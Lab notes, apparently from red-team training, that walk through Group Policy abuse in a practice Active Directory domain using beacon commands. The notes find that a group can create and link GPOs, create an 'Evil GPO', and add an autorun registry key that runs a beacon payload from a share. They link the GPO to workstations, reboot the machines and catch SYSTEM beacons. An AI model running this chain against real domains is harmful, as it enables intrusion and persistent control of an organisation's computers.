This shows that members of the "Developers" group can create new GPOs.
```powershell
beacon> powerpick Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }

[+] host called home, sent: 138058 bytes
[+] received output:
DEV\Developers
```
This shows that members of the "Developers" group can link GPOs to the "Workstations" OU.
```powershell
beacon> powerpick Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl

ObjectDN              : OU=Workstations,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : ReadProperty, WriteProperty
ObjectAceType         : GP-Link
SecurityIdentifier    : S-1-5-21-569305411-121244042-2357301523-1107
```
converting the `SecurityIdentifier`
```powershell
beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
[*] Tasked beacon to run: ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107 (unmanaged)
[+] host called home, sent: 10 bytes
[+] host called home, sent: 138048 bytes
[+] received output:
DEV\Developers

```
GPOs can be managed from the command line via the PowerShell RSAT modules.  These are an optional install and so usually only found on management workstations.  The `Get-Module` cmdlet will show if they are present.
```powershell
[12/20 21:52:35] beacon> powerpick Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
[+] host called home, sent: 10 bytes

Key                        Value                     
---                        -----                     
Backup-GPO                 Backup-GPO                
Block-GPInheritance        Block-GPInheritance       
Copy-GPO                   Copy-GPO                  
Get-GPInheritance          Get-GPInheritance         
Get-GPO                    Get-GPO                   
Get-GPOReport              Get-GPOReport             
Get-GPPermission           Get-GPPermission          
Get-GPPrefRegistryValue    Get-GPPrefRegistryValue   
Get-GPRegistryValue        Get-GPRegistryValue       
Get-GPResultantSetOfPolicy Get-GPResultantSetOfPolicy
Get-GPStarterGPO           Get-GPStarterGPO          
Import-GPO                 Import-GPO                
Invoke-GPUpdate            Invoke-GPUpdate           
New-GPLink                 New-GPLink                
New-GPO                    New-GPO                   
New-GPStarterGPO           New-GPStarterGPO          
Remove-GPLink              Remove-GPLink             
Remove-GPO                 Remove-GPO                
Remove-GPPrefRegistryValue Remove-GPPrefRegistryValue
Remove-GPRegistryValue     Remove-GPRegistryValue    
Rename-GPO                 Rename-GPO                
Restore-GPO                Restore-GPO               
Set-GPInheritance          Set-GPInheritance         
Set-GPLink                 Set-GPLink                
Set-GPPermission           Set-GPPermission          
Set-GPPrefRegistryValue    Set-GPPrefRegistryValue   
Set-GPRegistryValue        Set-GPRegistryValue       
Get-GPPermissions          Get-GPPermissions         
Set-GPPermissions          Set-GPPermissions         
```
Use the `New-GPO` cmdlet to create and link a new GPO.
```powershell
beacon> powerpick New-GPO -Name "Evil GPO"

DisplayName      : Evil GPO
DomainName       : dev.cyberbotic.io
Owner            : DEV\bfarmer
Id               : 550f6672-bdd0-4e3d-8907-628ee6909f26
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 9/8/2022 1:30:17 PM
ModificationTime : 9/8/2022 1:30:17 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        :
```
Some abuses can be implemented directly using RSAT.  For example, the `Set-GPPrefRegistryValue` cmdlet can be used to add an HKLM autorun key to the registry.
```powershell
beacon> powerpick Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\dns_x64.exe" -Type ExpandString
[+] received output:


DisplayName      : Evil GPO
DomainName       : dev.cyberbotic.io
Owner            : DEV\bfarmer
Id               : 34e3a752-e701-436e-be51-6e1fa2c0b46c
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 12/20/2023 9:54:41 PM
ModificationTime : 12/20/2023 9:56:42 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 1, SysVol Version: 1
WmiFilter        : 

```
Next, apply the GPO to the target OU.
- this is where the `GPO` actually gets put in.
```powershell
beacon> powerpick Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"
[+] received output:


GpoId       : 34e3a752-e701-436e-be51-6e1fa2c0b46c
DisplayName : Evil GPO
Enabled     : True
Enforced    : False
Target      : OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Order       : 5
```
![[Pasted image 20231220165907.png]]
Remember that HKLM autoruns require a reboot to execute.
 ---Didnt test the full reboot---

# In order to enable testing in [[4.1 Lateral Movement - After full lab reset]] section had to update gpo

Ended up testing the full reboot by going onto `WKSTN-1` & `WKSTN-2` and opening a `cmdline` to type `gpupdate /force` to enforce the modified `GPO` and `shutdown /r` to restart the machines
once the machines came back up I caught `ghost beacons` which are what occurs with `DNS` beacons

![[Pasted image 20231220172139.png]]
once typing `getuid` the information for each host populates

![[Pasted image 20231220172358.png]]
able to get into `WKSTN-2` System `beacon` from `DNS` beacons

![[Pasted image 20231220173031.png]]`